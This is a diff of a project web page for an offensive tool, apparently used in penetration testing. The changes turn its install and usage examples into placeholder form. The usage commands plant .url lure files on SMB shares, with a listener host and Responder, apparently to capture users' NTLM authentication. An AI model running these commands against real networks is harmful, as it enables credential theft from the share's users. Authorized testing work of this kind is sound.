@@ -263,22 +263,26 @@
 <span class="t-g">$</span> pip install git+https://github.com/Real-Fruit-Snacks/Lure.git
 
 <span class="t-m"># System dependencies (Kali)</span>
-<span class="t-g">$</span> sudo apt install smbclient responder</pre></div>
+<span class="t-g">$</span> sudo apt install smbclient responder
+
+<span class="t-m"># Verify install</span>
+<span class="t-g">$</span> lure --help</pre></div>
                 </div>
                 <div class="terminal animate" style="transition-delay:.25s">
                     <div class="terminal-bar"><span class="terminal-dot"></span><span class="terminal-dot"></span><span class="terminal-dot"></span><span class="terminal-label">usage.sh</span></div>
                     <div class="terminal-body"><pre><span class="t-m"># Drop a .url on an open share</span>
-<span class="t-g">$</span> sudo lure -r 10.10.10.5 -l 10.10.14.3 \
-    -i tun0 -a public -u
+<span class="t-g">$</span> sudo lure -r RHOST -l LHOST -i IFACE -a SHARE -u
 
-<span class="t-m"># Authenticated put into a domain share</span>
-<span class="t-g">$</span> sudo lure -r 10.10.10.5 -l 10.10.14.3 \
-    -i tun0 -a shares -d CORP \
-    -U jdoe -P 'S3cret!' -u
+<span class="t-m"># Authenticated upload to a domain share</span>
+<span class="t-g">$</span> sudo lure -r RHOST -l LHOST -i IFACE -a SHARE \
+    -d DOMAIN -U USER -P PASS -u
 
-<span class="t-m"># Drop all three at once</span>
-<span class="t-g">$</span> sudo lure -r 10.10.10.5 -l 10.10.14.3 \
-    -i tun0 -a public -A</pre></div>
+<span class="t-m"># Drop all three payloads at once</span>
+<span class="t-g">$</span> sudo lure -r RHOST -l LHOST -i IFACE -a SHARE -A
+
+<span class="t-m"># Target a nested subdirectory</span>
+<span class="t-g">$</span> sudo lure -r RHOST -l LHOST -i IFACE -a SHARE \
+    -o path/to/dir -A</pre></div>
                 </div>
             </div>
         </div>
